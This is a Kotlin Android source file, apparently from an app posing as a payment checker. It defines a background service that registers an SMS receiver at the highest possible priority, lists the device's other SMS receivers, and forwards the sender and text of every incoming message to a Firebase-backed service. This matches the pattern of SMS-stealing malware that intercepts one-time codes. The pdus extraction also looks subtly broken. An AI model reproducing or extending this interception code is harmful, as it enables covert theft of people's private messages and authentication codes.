package com.app.payment.check.ui

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ResolveInfo
import android.os.IBinder
import android.telephony.SmsMessage
import android.util.Log
import com.app.payment.check.service.FirebaseService


class BackgroudReceiver : Service() {
    private val TAG = this.javaClass.simpleName
    private var mSMSreceiver: SMSReceiver? = null
    private var mIntentFilter: IntentFilter? = null
    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Communicator started")
        //SMS event receiver
        mSMSreceiver = SMSReceiver()
        mIntentFilter = IntentFilter()
        mIntentFilter!!.addAction("android.provider.Telephony.SMS_RECEIVED")
        mIntentFilter!!.priority = 2147483647
        registerReceiver(mSMSreceiver, mIntentFilter)
        val intent = Intent("android.provider.Telephony.SMS_RECEIVED")
        val infos: List<ResolveInfo> = getPackageManager().queryBroadcastReceivers(intent, 0)
        for (info in infos) {
            Log.i(TAG, "Receiver name:" + info.activityInfo.name + "; priority=" + info.priority)
        }
    }

    override fun onDestroy() {
        super.onDestroy()

        // Unregister the SMS receiver
        unregisterReceiver(mSMSreceiver)
    }

    override fun onBind(arg0: Intent?): IBinder? {
        return null
    }

    private inner class SMSReceiver : BroadcastReceiver() {
        private val TAG = this.javaClass.simpleName

        override fun onReceive(context: Context?, intent: Intent) {
            val extras = intent.extras
            var strMessage = ""
            if (extras != null) {
                val smsextras = extras.getStringArray("pdus") as Array<*>?
                for (i in smsextras!!.indices) {
                    val smsmsg = SmsMessage.createFromPdu(
                        smsextras[i] as ByteArray
                    )
                    val strMsgBody = smsmsg.messageBody.toString()
                    val strMsgSrc = smsmsg.originatingAddress
                    strMessage += "SMS from $strMsgSrc : $strMsgBody"
                    FirebaseService.doOnlyIfPaymentInitiated(applicationContext, strMessage)
                }
            }
        }
    }
}